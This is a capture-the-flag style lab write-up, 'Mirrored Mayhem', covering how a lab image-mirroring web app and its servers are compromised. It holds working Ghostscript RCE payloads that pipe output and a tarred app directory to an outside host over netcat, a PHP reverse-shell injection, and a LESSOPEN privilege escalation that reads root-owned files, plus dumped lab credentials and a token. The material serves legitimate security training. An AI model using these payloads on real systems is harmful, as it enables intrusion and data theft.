# Lab 9 - Mirrored Mayhem

## Table of Contents
- [Lab 9 - Mirrored Mayhem](#lab-9---mirrored-mayhem)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Send Files Across Servers](#send-files-across-servers)
  - [Web Application Analysis](#web-application-analysis)
  - [RCE Vulnerability Analysis](#rce-vulnerability-analysis)
    - [Inject PHP Code](#inject-php-code)
    - [Inject PostScript Code](#inject-postscript-code)
  - [RCE Solution](#rce-solution)
    - [List Files](#list-files)
    - [Web App Server Environment Variables](#web-app-server-environment-variables)
    - [Grab all the files under `/opt/app`](#grab-all-the-files-under-optapp)
    - [Web Token](#web-token)
    - [Next Step](#next-step)
  - [Application Host Analysis](#application-host-analysis)
  - [Behind the Mirror Server Analysis](#behind-the-mirror-server-analysis)
    - [User Token](#user-token)
    - [Unlock Code](#unlock-code)
    - [Root Token](#root-token)
    - [Server Enumeration](#server-enumeration)
      - [Server Environment Variables](#server-environment-variables)
      - [Find SUID (Set User ID) Files](#find-suid-set-user-id-files)
      - [Find SGID (Set Group ID) Files](#find-sgid-set-group-id-files)
      - [Find World-Writable Directories](#find-world-writable-directories)
  - [Privilege Escalation Vulnerability](#privilege-escalation-vulnerability)
  - [Privilege Escalation Solution](#privilege-escalation-solution)
  - [Central Locking System Analysis](#central-locking-system-analysis)
  - [Unlock Code Solution](#unlock-code-solution)
  - [Final Solution](#final-solution)
  - [Navigation](#navigation)

---

## Overview

This lab provides access to a web application and servers than need to be exploited with RCE and privilege escalation techniques to get answers to the questions.

---

## Send Files Across Servers

The following commands that be used to send files over from the Kali "Host" machine to the **Behind the Mirror** "Victim" machine:

1. On the Host machine, go to the directory with all the files to transfer.
   ```bash
   cd /path/to/dir/with/files
   ```
2. Start an HTTP server in port 80 using Python:
   ```bash
   sudo python3 -m http.server 80
   ```
   ```
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```
3. On the Victim machine use cURL to bring the file(s) over:
   ```bash
   curl 10.102.61.169/file.ext > file.ext
   ```
4. The Host will show a message indicating the transfer:
   ```
   10.102.50.138 - - [19/Oct/2024 20:26:53] "GET /file.ext HTTP/1.1" 200 -
   ```

---

## Web Application Analysis

The web application allows users to upload mask images to be mirrored for fun:

1. Uploaded files are send to BLOB storage:
   ```
   blob:http://funhouse.mirrors/0e093bca-fb39-4d40-8ffb-76ca91433ea1
   ```
2. The image is processed with `exiftool` to create a mirror image.
3. Processed (mirrored) files are new files prefixed with "pil_":
   ```
   http://funhouse.mirrors/mirrored/pil_32895e65ec7d.png
   ```
4. Saved mirrored images are placed under `~/Downloads/souvenir.png` on the client.

When loading the different mask files and saving the output, the `exiftool` shows that the transformation is randomly selected and controlled by a parameter `?mirror=n`.

When `?mirrorn=1`, the transformation logic uses Ghostscript v9.23 (2018-03-21), which has a known RCE vulnerability when loading files.
```bash
$ exiftool souvenir.png
```
```
ExifTool Version Number         : 12.67
File Name                       : souvenir.png
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2024:10:09 04:23:02+00:00
File Access Date/Time           : 2024:10:09 04:23:02+00:00
File Inode Change Date/Time     : 2024:10:09 04:23:24+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 256
Image Height                    : 128
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Version                         : Ghostscript v9.23 (2018-03-21)
Parameters                      : ?mirror=1
Image Size                      : 256x128
Megapixels                      : 0.033
```

---

## RCE Vulnerability Analysis

We should be able to send an image with malicious content to run commands on the server during the upload.

### Inject PHP Code
Below are a few common steps to inject PHP code in an image:

1. Use the `exiftool` command to inject PHP code in an image attribute:
    ```bash
    exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" image.jpg

    exiftool -Comment="<?php phpinfo(); __halt_compiler(); ?>" image.jpg
    ```
2. Rename file to `image.php.jpeg` and upload it to the server.
3. Load the image on the server and have the PHP parser process it.

**Example:**

This is an example using PHP to take control of the remote system:
```bash
exiftool -Comment=’<?php system(“nc <YourIP> <YourPort> -e /bin/bash”); ?>’ filename.png
```

1. Upload the image to the server.
2. Run netcat (`nc`) on the client to listen on the specified port to take control remotely:
   ```bash
   sudo nc -nlvp <YourPort>
   ```
3. Once the file is loaded on the server, the embedded PHP command is executed, the connection will be established, the shell will be opened and you will be able to run commands remotely via nc.

### Inject PostScript Code

One option is to inject code while writing a file:
```bash
$ cat rce.jpg
```
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%ls -asl | nc 10.102.176.150 4444) currentdevice putdeviceprops
```

Another option is to use the vulnerabilities described in:

- `https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509`
- `https://securitylab.github.com/research/ghostscript-CVE-2018-19475`

```bash
$ cat rce.png
```
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
0 1 300367 {} for
{save restore} stopped {} if
(%pipe%ls -asl | nc 10.102.176.150 4444) (w) file
```

When this file is uploaded and processed by Ghostscript to generate the mirror image, it will execute the command embedded in the file.

---

## RCE Solution

We will craft an image file with PostScript (PS) code to execute a command on the server using `(%pipe%<command>)` with the ability to redirect the output using `nc`.

Let's create a [`RCE.png`](./RCE.png) file with the following content:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
0 1 300367 {} for
{save restore} stopped {} if
(%pipe%<command> | nc 10.102.176.150 4444) (w) file
```
where `<command>` will be set to whatever command we want to run on the application server side.

Meanwhile, on the client side, we will run this comamnd to receive the command's outputs:
```bash
$ sudo nc -nlvp 4444
```
```
listening on [any] 4444 ...
connect to [10.102.176.150] from (UNKNOWN) [10.102.102.95] 34728
```

### List Files
**Server-Side Command:** `ls -asl`

**Client-Side Output:**
```bash
total 12
     0 drwxrwxrwx    1 root     root            70 Oct  9 03:49 .
     0 drwxr-xr-x    1 root     root            17 Oct 20  2023 ..
     0 drwxr-xr-x    2 iml      nogroup         32 Oct  9 03:49 __pycache__
     4 -rwxrwxrwx    1 root     root          2402 Oct 20  2023 app.py
     0 drwxrwxrwx    1 root     root            34 Oct 20  2023 src
     0 drwxrwxrwx    1 root     root            21 Oct 20  2023 static
     0 drwxrwxrwx    1 root     root            56 Oct 20  2023 templates
     4 -rw-r--r--    1 root     root             7 Oct  9 03:49 webapp-token
     4 -rwxrwxrwx    1 root     root            51 Oct 20  2023 whatsinthemirror?
```

### Web App Server Environment Variables
**Server-Side Command:** `env`

**Client-Side Output:**
```bash
ANNOUNCE_READY=true
API_ENV=production
API_PROXY_PORT=tcp://172.20.246.128:8080
API_PROXY_PORT_8080_TCP=tcp://172.20.246.128:8080
API_PROXY_PORT_8080_TCP_ADDR=172.20.246.128
API_PROXY_PORT_8080_TCP_PORT=8080
API_PROXY_PORT_8080_TCP_PROTO=tcp
API_PROXY_SERVICE_HOST=172.20.246.128
API_PROXY_SERVICE_PORT=8080
API_PROXY_SERVICE_PORT_HTTP=8080
ATTEMPT_ID=5c700b05a446367498734f62a41fc3fb
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_PORT=tcp://172.20.18.254:443
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_PORT_443_TCP=tcp://172.20.18.254:443
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_PORT_443_TCP_ADDR=172.20.18.254
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_PORT_443_TCP_PORT=443
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_PORT_443_TCP_PROTO=tcp
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_SERVICE_HOST=172.20.18.254
DATADOG_CLUSTER_AGENT_ADMISSION_CONTROLLER_SERVICE_PORT=443
DATADOG_CLUSTER_AGENT_PORT=tcp://172.20.207.17:5005
DATADOG_CLUSTER_AGENT_PORT_5005_TCP=tcp://172.20.207.17:5005
DATADOG_CLUSTER_AGENT_PORT_5005_TCP_ADDR=172.20.207.17
DATADOG_CLUSTER_AGENT_PORT_5005_TCP_PORT=5005
DATADOG_CLUSTER_AGENT_PORT_5005_TCP_PROTO=tcp
DATADOG_CLUSTER_AGENT_SERVICE_HOST=172.20.207.17
DATADOG_CLUSTER_AGENT_SERVICE_PORT=5005
DATADOG_CLUSTER_AGENT_SERVICE_PORT_AGENTPORT=5005
DATADOG_PORT=udp://172.20.126.166:8125
DATADOG_PORT_8125_UDP=udp://172.20.126.166:8125
DATADOG_PORT_8125_UDP_ADDR=172.20.126.166
DATADOG_PORT_8125_UDP_PORT=8125
DATADOG_PORT_8125_UDP_PROTO=udp
DATADOG_PORT_8126_TCP=tcp://172.20.126.166:8126
DATADOG_PORT_8126_TCP_ADDR=172.20.126.166
DATADOG_PORT_8126_TCP_PORT=8126
DATADOG_PORT_8126_TCP_PROTO=tcp
DATADOG_SERVICE_HOST=172.20.126.166
DATADOG_SERVICE_PORT=8125
DATADOG_SERVICE_PORT_DOGSTATSDPORT=8125
DATADOG_SERVICE_PORT_TRACEPORT=8126
HOME=/home/iml
HOSTNAME=funhouse-mirrors
KUBERNETES_PORT=tcp://172.20.0.1:443
KUBERNETES_PORT_443_TCP=tcp://172.20.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=172.20.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_HOST=172.20.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/opt/app
SERVER_SOFTWARE=gunicorn/20.1.0
SHLVL=2
STATSD_SINK_PORT=udp://172.20.64.235:8125
STATSD_SINK_PORT_8125_UDP=udp://172.20.64.235:8125
STATSD_SINK_PORT_8125_UDP_ADDR=172.20.64.235
STATSD_SINK_PORT_8125_UDP_PORT=8125
STATSD_SINK_PORT_8125_UDP_PROTO=udp
STATSD_SINK_SERVICE_HOST=172.20.64.235
STATSD_SINK_SERVICE_PORT=8125
STATSD_SINK_SERVICE_PORT_DOGSTATSDPORT=8125
VOYAGER_AUTH_TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJhdHRlbXB0X2lkIjoxMjg3NTExMCwiYXVkIjpbInZveWFnZXIiXSwic2NwIjoiYWNjb3VudCIsInN1YiI6IjQ2MTc5MCIsImFjY2VzcyI6ImJhc2ljIiwiaWF0IjoxNzI4NDQ1NzcyLCJleHAiOiIxNzI4NDYwMTcyIn0.x1ATia6u1wfyXRxDA-bWUiTkLK95aR2aeMnCWWh3BP8
VOYAGER_URL=http://voyeuger:8080/graphql
VOYEUGER_PORT=tcp://172.20.61.187:8080
VOYEUGER_PORT_8080_TCP=tcp://172.20.61.187:8080
VOYEUGER_PORT_8080_TCP_ADDR=172.20.61.187
VOYEUGER_PORT_8080_TCP_PORT=8080
VOYEUGER_PORT_8080_TCP_PROTO=tcp
VOYEUGER_SERVICE_HOST=172.20.61.187
VOYEUGER_SERVICE_PORT=8080
VOYEUGER_SERVICE_PORT_VOYEUGER=8080
```

### Grab all the files under `/opt/app`
1. Pack all the files on the server using `find /opt/app -exec tar czf - {} +`:
    ```bash
    $ cat rce.png
    ```
    ```
    %!PS-Adobe-3.0 EPSF-3.0
    %%BoundingBox: -0 -0 100 100
    0 1 300367 {} for
    {save restore} stopped {} if
    (%pipe%find /opt/app -exec tar czf - {} + | nc 10.102.175.121 4444) (w) file
    ```
2. Unpack them on the client using `tar xz`:
    ```bash
    $ sudo nc -nlvp 4444 | tar xz
    ```

### Web Token
* The `webapp-token` file has one of the values needed.

### Next Step
* The `whatsinthemirror?` file contains information for the next step.

---

## Application Host Analysis

In the application host environment, the `whatsinthemirror?` file provides credentials for the "Behind the Mirror" server:
```bash
$ cat "whatsinthemirror?"
```
```
umbrorath:0bscurum-sp3culum@behind-the-mirror[?]
```

Checking what is available in the server with Nmap confirms that SSH is running on a non-standard port.
```bash
$ nmap -sC -sV -oA default 10.102.111.255
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-09 16:53 UTC
Nmap scan report for ip-10.102.111.255.eu-west-1.compute.internal (10.102.111.255)
Host is up (0.00044s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
33/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 31091501f7b2abe586076c43b39a873d (RSA)
|   256 35c0897ffa44fc9bf71053f5a29bfe84 (ECDSA)
|_  256 48a51db77cca8f6637f1fe5f9aebcfbd (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

Which is confirmed again with Netcat.
```bash
$ nc -v 10.102.111.255 33
```
```
ip-10.102.111.255.eu-west-1.compute.internal [10.102.111.255] 33 (?) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

Let's log into the server using SSH and the non-standard port:
```bash
$ ssh umbrorath@10.102.111.255 -p 33
```
```
The authenticity of host '[]:33 ([10.102.111.255]:33)' can't be established.
ED25519 key fingerprint is SHA256:AsqFFn7QxXzQYSoMORRlasrycYca8GLoNAeEn/sbEaw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.102.111.255]:33' (ED25519) to the list of known hosts.
Ubuntu 20.04.4 LTS
umbrorath@'s password:
```

---

## Behind the Mirror Server Analysis
```
==================================================================================================
=  =====  ========================================  =====  =======================================
=   ===   ========================================   ===   =======================================
=  =   =  ========================================  =   =  =======================================
=  == ==  ==  ==  =   ===  =   ====   ===  =   ===  == ==  ==  ==  =   ===  =   ====   ===  =   ==
=  =====  ======    =  ==    =  ==     ==    =  ==  =====  ======    =  ==    =  ==     ==    =  =
=  =====  ==  ==  =======  =======  =  ==  =======  =====  ==  ==  =======  =======  =  ==  ======
=  =====  ==  ==  =======  =======  =  ==  =======  =====  ==  ==  =======  =======  =  ==  ======
=  =====  ==  ==  =======  =======  =  ==  =======  =====  ==  ==  =======  =======  =  ==  ======
=  =====  ==  ==  =======  ========   ===  =======  =====  ==  ==  =======  ========   ===  ======
==================================================================================================
As you walk up to the final mirror, a message can be seen...
.ezam eht epacse ot rorrim eht kaerB ...htarorbmu olleH
```

Checking the prompt configuration (`PS0`), every time you run a command, it clears the screen and it shows the result of the last command mirrored:

- The result of the last command is retrieved using an internal command `responses`.
- The output mirroring is done with another internal command `mm`.

Since the responses from all the commands executed are mirrored you can pipe the command to `mm`, which is the local executable that does the mirroring.
```bash
umbrorath@behind-the-mirror :> ls -asl | mm
```
```
You can see a reply...
 lsa- sl <: rorrim-eht-dniheb@htarorbmu
total 16
0 drwxr-xr-x 1 umbrorath umbrorath   94 Oct 17 02:31 .
0 drwxr-xr-x 1 root      root        23 Oct 20  2023 ..
4 -rw-r--r-- 1 umbrorath umbrorath  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 umbrorath umbrorath 3764 Oct 20  2023 .bashrc
4 -rw-r--r-- 1 umbrorath umbrorath  807 Feb 25  2020 .profile
0 lrwxrwxrwx 1 root      root        17 Oct 17 02:31 unlock-code -> /root/unlock-code
4 -rw-r--r-- 1 root      root         7 Oct 17 02:31 user-token

```

### User Token
There is a `user-token` file in the user's home directory. Let's check the content:
```bash
umbrorath@behind-the-mirror :> cat user-token | mm
```
```
You can see a reply...
nekot-resu tac <: rorrim-eht-dniheb@htarorbmu
381ca3
```

### Unlock Code
There is another file `/root/unlock-code` that requires `root` permissions to access.

### Root Token
There is also a file `/root/root-token.txt` that requires `root` permissions to access.

### Server Enumeration
Let's explore the environment to find any vulnerabilities.

#### Server Environment Variables
```bash
umbrorath@behind-the-mirror :< env | mm
```
```
You can see a reply...
mm | <: rorrim-eht-dniheb@htarorbmu
SHELL=/bin/bash
PWD=/home/umbrorath
LOGNAME=umbrorath
HOME=/home/umbrorath
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.102.84.67 60298 10.102.88.130 33
LESSCLOSE=/usr/bin/lesspipe %s %s
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=umbrorath
SHLVL=1
PS0=$(clear && responses | mm)\n$(history 1 | cut -d' ' -f7- | mm) <: $(hostname | mm)@$(whoami | mm)\n
PS1=\numbrorath@behind-the-mirror :> 
SSH_CLIENT=10.102.84.67 60298 33
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
MAIL=/var/mail/umbrorath
SSH_TTY=/dev/pts/0
_=/usr/bin/env
```

#### Find SUID (Set User ID) Files
```bash
umbrorath@behind-the-mirror :> find / -perm -4000 -ls 2> /dev/null | mm
```
```
You can see a reply...
mm | llun/ved/ >2 sl- 0004- mrep- / <: rorrim-eht-dniheb@htarorbmu
  9455793     84 -rwsr-xr-x   1 root     root        85064 Mar 14  2022 /usr/bin/chfn
  9455799     52 -rwsr-xr-x   1 root     root        53040 Mar 14  2022 /usr/bin/chsh
  9455860     88 -rwsr-xr-x   1 root     root        88464 Mar 14  2022 /usr/bin/gpasswd
  9455917     56 -rwsr-xr-x   1 root     root        55528 Feb  7  2022 /usr/bin/mount
  9455922     44 -rwsr-xr-x   1 root     root        44784 Mar 14  2022 /usr/bin/newgrp
  9455933     68 -rwsr-xr-x   1 root     root        68208 Mar 14  2022 /usr/bin/passwd
  9456028     68 -rwsr-xr-x   1 root     root        67816 Feb  7  2022 /usr/bin/su
  9456053     40 -rwsr-xr-x   1 root     root        39144 Feb  7  2022 /usr/bin/umount
 71349491     16 -rwsr-xr-x   1 root     root        14568 Feb  7  2022 /usr/bin/mm
436227889    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
548410978    464 -rwsr-xr-x   1 root     root       473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
```

#### Find SGID (Set Group ID) Files
```bash
umbrorath@behind-the-mirror :> find / -perm -2000 -ls 2> /dev/null | mm
```
```
You can see a reply...
mm | llun/ved/ >2 sl- 0002- mrep- / <: rorrim-eht-dniheb@htarorbmu
  9455790     84 -rwxr-sr-x   1 root     shadow      84512 Mar 14  2022 /usr/bin/chage
  9455843     32 -rwxr-sr-x   1 root     shadow      31312 Mar 14  2022 /usr/bin/expiry
  9456067     36 -rwxr-sr-x   1 root     tty         35048 Feb  7  2022 /usr/bin/wall
436227690     16 -rwxr-sr-x   1 root     tty         14488 Mar 30  2020 /usr/bin/bsd-write
436227882    344 -rwxr-sr-x   1 root     ssh        350504 Mar 30  2022 /usr/bin/ssh-agent
 57675508     16 -rwxr-sr-x   1 root     utmp        14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
216011481     44 -rwxr-sr-x   1 root     shadow      43168 Sep 17  2021 /usr/sbin/pam_extrausers_chkpwd
216011512     44 -rwxr-sr-x   1 root     shadow      43160 Sep 17  2021 /usr/sbin/unix_chkpwd
624954237      0 drwxrwsr-x   2 root     staff           6 Apr 15  2020 /var/local
628101796      0 drwxrwsr-x   2 root     mail            6 Aug  1  2022 /var/mail
```

#### Find World-Writable Directories
```bash
umbrorath@behind-the-mirror :> find / -xdev -type d -perm -0002 -ls 2> /dev/null
```
```
You can see a reply...
mm | llun/ved/ >2 sl- 2000- mrep- d epyt- vedx- / <: rorrim-eht-dniheb@htarorbmu
  2379064      0 drwxrwxrwt   2 root     root            6 Aug  1  2022 /run/lock
434211286      0 drwxrwxrwt   2 root     utmp            6 Aug 18  2022 /run/screen
  7435593      0 drwxrwxrwt   1 root     root            6 Aug  1  2022 /tmp
  1339639      0 drwxrwxrwt   2 root     root            6 Aug  1  2022 /var/tmp
```

---

## Privilege Escalation Vulnerability
- The enumeration shows that the `mm` command has SETUID permission.
- The `env` list shows `LESSOPEN` and `LESSCLOSE` env vars defined.
- There are a couple of known vulnerabilities with the command "less":
  - **CVE-2024-32487:** quoting is mishandled in the `less` code, leading to OS command execution while opening files with attacker-controlled file names. Exploitation requires the creation of specially crafted filenames containing newline characters to inject malicious commands through the `LESSOPEN` environment variable.
  - **CVE-2022-48624:** logic in `less` omits `shell_quote` calls for `LESSCLOSE`, a command line to invoke the optional input postprocessor. This issue could lead to an OS command injection vulnerability and arbitrary command execution on the host operating system. Exploitation requires the ability to influence the `LESSCLOSE` environment variable.
- The version of `less` in the environment is 551.

## Privilege Escalation Solution
We will take advantage of the vulnerability with `LESSOPEN`:

1. Create a file with a newline character in the name:
   ```bash
   touch "file\nstuff.txt"
   ```
2. Set the `LESSOPEN` environment variable to run `mm` with the file owned by `root` to open and execute the `less` command on the newly created file:
   ```bash
   export LESSOPEN="| mm /root/root-token %s"; less file\\rstuff.txt
   ```
   ```
   58639c
   ```
   ```bash
   export LESSOPEN="| mm /root/unlock-code %s"; less file\\rstuff.txt
   ```
   ```
   79265537874
   ```

> [!NOTE] Some times the command may not show a response in the console. You can pipe the output to `| mm` or run `responses` to show the last result.

---

## Central Locking System Analysis

Standard port scanning on this server does not show anything available:
```bash
$ nmap -sC -sV -oA default 10.102.73.133
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-23 08:23 UTC
Nmap scan report for ip-10-102-73-133.eu-west-1.compute.internal (10.102.73.133)
Host is up (0.00017s latency).
All 1000 scanned ports on ip-10-102-73-133.eu-west-1.compute.internal (10.102.73.133) are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

Expanding the search to non-standard ports (all 62,535 ports) shows that there is one port available:
```bash
$ nmap -p- 10.102.73.133
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-23 08:20 UTC
Nmap scan report for ip-10-102-73-133.eu-west-1.compute.internal (10.102.73.133)
Host is up (0.00014s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT      STATE SERVICE
65333/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
```

It looks like port 65333/tcp is open on the Central Locking System, but the service running on this port is listed as unknown. This could be the port we need to interact with to send the unlock code.

---

## Unlock Code Solution

```bash
$ nc 10.102.73.133 65333
```
```
What is the unlock code? 79265537874
Unlock code accepted. Unlocking doors!
The static code you will need for the final question is WhyDontYouTakeASeat
```

---

## Final Solution

What is the code provided once you unlock the door? `WhyDontYouTakeASeat`

Take a note of it! You'll also need it as a code in the final lab of the collection.

---

## Navigation

| |
|:---|
| ← [Haywire Host](../lab-8-haywire-host/README.md) |
